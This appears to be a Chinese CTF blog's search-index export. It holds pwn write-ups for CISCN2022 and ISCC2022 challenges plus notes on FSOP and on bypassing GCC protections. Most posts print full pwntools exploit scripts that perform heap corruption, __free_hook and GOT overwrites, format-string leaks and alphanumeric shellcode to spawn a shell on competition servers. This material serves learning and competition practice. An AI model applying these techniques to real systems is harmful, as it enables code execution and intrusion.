<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CISCN2022_pwn_wp</title>
    <url>/2022/07/03/CISCN2022-pwn-wp/</url>
    <content><![CDATA[<p>pwn签到</p>
<span id="more"></span>

<h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的流程是登录执行shellcode，shellcode需要通过检测，使用alpha3生成一个可见字符串shellcode。</p>
<p>生成的shellcode的内容为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>然后利用alpha3来将其转为可见字符形式，且这道题的shellcode的地址是存放在rdx中的，因此在使用alpha3时应该生成 call rdx。<a href="http://blog.rabb1t.xyz/2022/02/08/alphanumeric-shellcode/">alphanumeric_shellcode</a></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">23231</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;msg: ro0t \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 1\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;msg: &#x27;</span>+shellcode+<span class="string">&#x27; \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 2\n&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>FSOP</title>
    <url>/2022/05/27/FSOP/</url>
    <content><![CDATA[<p>通过劫持 _IO_list_all 来伪造链表</p>
<span id="more"></span>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>_IO_list_all 中保存着 IO_FILE 结构体的链表，因此我们可以通过将伪造的 fake_FILE 插入其中来实施攻击。</p>
<p>由于链表通过 _chain 来链接，而 _chain 相对 IO_FILE 的偏移为 0x68，所以最常见的插入链表操作为：伪造一个 fake_FILE 并放入 0x60 大小的 smallbin 中，这个位置正好相对于 main_arena+88(&amp;bin[0]) 的偏移为 0x68，所以我们使用 unsortedbin_attack 将 IO_list_all 覆盖为 main_arena+88 即可。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>通过调用 _IO_flush_all_lockp，来刷新 _IO_list_all 链表中所有项的文件流，意味着会调用 vtable 中的 _IO_overflow。</p>
<p>调用 _IO_flush_all_lockp 的情况有：</p>
<ol>
<li>当 libc 执行 abort 流程时</li>
<li>当执行 exit 函数时</li>
<li>当执行流从 main 函数返回时</li>
</ol>
<p>而当 glibc 检测 memory corruption 时，会调用 abort() ，因此执行流程为:</p>
<ol>
<li>调用 abort()</li>
<li>调用 _IO_flush_all_lockp()</li>
<li>调用 JUMP_FIELD(_IO_overflow_t,__overflow)</li>
</ol>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/io-file/figure/abort_routine.001.jpeg" alt="abort_routine"></p>
<p>如果我们将 system 作为伪造的 __overflow 指针，FILE 开头为 /bin/sh 就能获得 shell 了，或者直接使用 one_gadget。</p>
<p>然后当我们需要伪造一个 fake_FILE时，需要通过的检测为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>因此需要伪造的内容有 _mode&lt;=0, _IO_write_ptr&gt;_IO_write_base, IO_overflow=attack。</p>
<p>以上成员相对于 IO_FILE 首地址到偏移分别为 0xc0, 0x28, 0x20, 0xd8+24。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>FSOP</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC保护机制</title>
    <url>/2022/03/08/GCC%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>简单介绍Linux下的GCC保护机制。</p>
<span id="more"></span>

<h2 id="地址随机化-PIE"><a href="#地址随机化-PIE" class="headerlink" title="地址随机化(PIE)"></a>地址随机化(PIE)</h2><p>在我们之前介绍的ROP攻击中，我们的主要目的是插入一个指向攻击代码的<strong>指针</strong>，这个代码可以是我们输入的(ret2shellcode)，也可以是程序中有的(ret2text、ret2libc)。</p>
<p>而当我们在同一个操作系统版本上运行同一个程序，即使是不同机器，栈的位置也是固定的，这使得栈地址非常容易被预测。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈随机化的思想就是使程序每次运行时，都使得栈的位置在变化。它的简单实现方式是：在程序开始时，在栈上分配一个指定的0~n个字节之间的随机大小空间，程序不使用这段空间，但它会导致程序执行时，后续的栈的位置发生了变化。而这个值n不能太大(太大浪费)，也不能太小(太小得到的随机化地址变化太少)，在32位linux中，地址大致分布在<code>0xff7fc59c</code>到<code>0xffffd09c</code>内,范围大约为2^23^；64位linux中，地址大致分布在<code>0x7fff000比98</code>到<code>0x7ffffffaa4a8</code>内，范围大约为2^32^。</p>
<p> 在Linux中，栈随机化是属于<strong>地址空间布局随机化</strong>技术中的一种(简称ASLR，address-space layout randomization)，而整个ASLR技术比较复杂。采用ASLR技术，使得每次运行时，除了栈外的程序中的其他段也都会被加载到内存中的不同区域，保护性更强。</p>
<h3 id="克服方法"><a href="#克服方法" class="headerlink" title="克服方法"></a>克服方法</h3><ul>
<li>泄露地址<ul>
<li>格式化字符串漏洞泄露栈上地址</li>
<li>构造ROPchain调用输出函数，将got表中存储的地址泄露</li>
</ul>
</li>
<li>若不能泄露地址，也能够通过暴力手段克服随机化保护<ul>
<li>若能够执行到我们写入的攻击代码，那么我们可以在有效的攻击代码前插入很长一段<code>nop</code>指令，然后只需要猜中其中一段指令的地址写入，那么在执行时就一定会执行到有效的攻击代码。这样的整个攻击代码称作”空操作雪橇”(“nop sled”)。</li>
</ul>
</li>
</ul>
<h2 id="栈破坏检测-Stack"><a href="#栈破坏检测-Stack" class="headerlink" title="栈破坏检测(Stack)"></a>栈破坏检测(Stack)</h2><p>栈破坏检测能有效的防止利用栈溢出漏洞来破坏栈上的结构</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在栈帧中放入一段canary值，开启了栈破坏检测保护的程序，执行时会随机产生canary。在程序恢复寄存器状态和从函数返回前，程序都会检测canary是否被改变，如果是，那么程序异常结束。</p>
<p><em>canary：金丝雀。矿工下矿前会放一只鸟进去，能够提前预知意外。</em></p>
<h3 id="克服方法-1"><a href="#克服方法-1" class="headerlink" title="克服方法"></a>克服方法</h3><p>canary通常存放在栈帧上第一个内存地址中，可以通过调试进行寻找，它的标志是最后一字节为<code>0x00</code>，是为了防止输出下一个内存地址时将其泄露，且该位不属于被检测的部分。</p>
<ul>
<li>泄露canary，之后将其加入payload中的指定位置<ul>
<li>若程序能够输出我们写入的字符串，并且存在栈溢出漏洞，那么能够利用该漏洞将canary的最后一位给覆盖掉，再执行输出时能够泄露。</li>
<li>利用格式化字符串漏洞直接泄露</li>
</ul>
</li>
<li>若不能泄露canary，其实我们能够利用其机制来泄露其他信息，原理是：程序检测canary，实际上是通过调用<code>__stack_chk_fail</code>函数来实现的。在检测到canary异常时，会打印出<code>__libc_argv[0]</code>指针指向的内容，一般为程序名。那么我们利用漏洞，将argv[0]的内容改为其他信息的地址，在执行报错时就会泄露信息。</li>
</ul>
<h2 id="限制可执行代码区域-NX"><a href="#限制可执行代码区域-NX" class="headerlink" title="限制可执行代码区域(NX)"></a>限制可执行代码区域(NX)</h2><p>虚拟内存中，存在’页’的概念，一个页的大小一般是2048或4096个字节。典型的程序保护中，每个页都有一个标志，该标志的每位由硬件检测并指明该页的’可读’、’可写’、’可执行’权限。曾经<code>x86</code>体系将’可读’和’可执行’合并成一个标志位，而栈上数据一定是可读写的，所以会有向栈中写入攻击代码而被执行的危险。虽然有过很多机制，能够限制一些页的可读但是不可执行，却会带来严重的性能损失。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>向内存中引入了’NX’(No-Execute)位，将’可读’和’可执行’权限分开来了，而页依旧由硬盘来检测，效率没有损失。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2022_pwn方向部分writeup</title>
    <url>/2022/05/27/ISCC2022-pwn%E6%96%B9%E5%90%91writeup/</url>
    <content><![CDATA[<p>做的很开心。</p>
<span id="more"></span>

<h2 id="untidy-note"><a href="#untidy-note" class="headerlink" title="untidy_note"></a>untidy_note</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./untidy_note&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7030</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./untidy_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;Your choose is:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the note size is:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the size is:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Welcome to use untidy_note,Your name is:&quot;</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#14</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#19</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#20</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#21</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#22</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p16(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">main_arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebc40</span></span><br><span class="line">libc=elf.libc</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#24</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">24</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5810)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;remove&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400896</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(elf.got[<span class="string">&quot;strncmp&quot;</span>])+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,p64(backdoor)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,7010)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\%39$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">241</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main)</span><br><span class="line">system=libc[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr.fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;/bin/bash\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Huge-Space"><a href="#Huge-Space" class="headerlink" title="Huge_Space"></a>Huge_Space</h2><p>这道题找师兄抄的，我本地打不通。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5330)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;+++&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(<span class="number">1</span>,-<span class="number">0x1280</span>,<span class="string">&quot;aaaaaa&quot;</span>)  <span class="comment"># 本地不可发送</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,p8(<span class="number">1</span>)*<span class="number">0x70</span>+p64(elf.got[<span class="string">&quot;strncmp&quot;</span>]))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p64(elf.plt[<span class="string">&quot;system&quot;</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>也是抄师兄的，不会 IO_FILE 捏。</p>
